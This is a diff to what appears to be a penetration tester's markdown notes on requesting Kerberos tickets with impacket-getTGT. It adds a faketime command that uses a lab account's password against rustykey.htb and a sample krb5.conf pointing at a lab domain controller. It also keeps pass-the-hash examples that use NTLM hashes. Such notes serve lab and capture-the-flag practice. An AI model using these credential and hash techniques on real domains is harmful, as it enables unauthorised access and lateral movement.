@@ -9,9 +9,15 @@ impacket-getTGT <domain>/<username>:<password>
 getTGT.py <domain>/<username>
 ```
 
+Geeting a ticket using credential:
+
+```shell
+faketime "$(ntpdate -q rustykey.htb | awk '{print $1" "$2}')" impacket-getTGT rustykey.htb/'rr.parker':'8#t5HE8L!W3A'
+```
+
 Getting a ticket with NTLM hash:
 
-```
+```shell
 impacket-getTGT  -hashes :<ntlm_hash> <domain>/'<username>'
 impacket-getTGT  -hashes :aad3b435b51404eeaad3b435b51404ee vintage.htb/'GMSA01$'
 ```
@@ -27,7 +33,26 @@ Then get the ticket and export it:
 
 export KRB5CCNAME=<path_to_ticket>
 
-Finally edit /etc/krb5.conf with the domain name and the dc name.
+Finally edit /etc/krb5.conf with the domain name and the dc name. Example:
+
+```
+[libdefaults]
+    default_realm = RUSTYKEY.HTB # change this
+    dns_lookup_realm = false
+    dns_lookup_kdc = false
+    ticket_lifetime = 24h
+    renew_lifetime = 7d
+    forwardable = true
+
+[realms]
+    RUSTYKEY.HTB = { # change this
+        kdc = 10.129.232.127 # change this
+    }
+
+[domain_realm]
+    .example.com = RUSTYKEY.HTB #change this
+    example.com = RUSTYKEY.HTB #change this
+```
 
 Connect by doing:
 
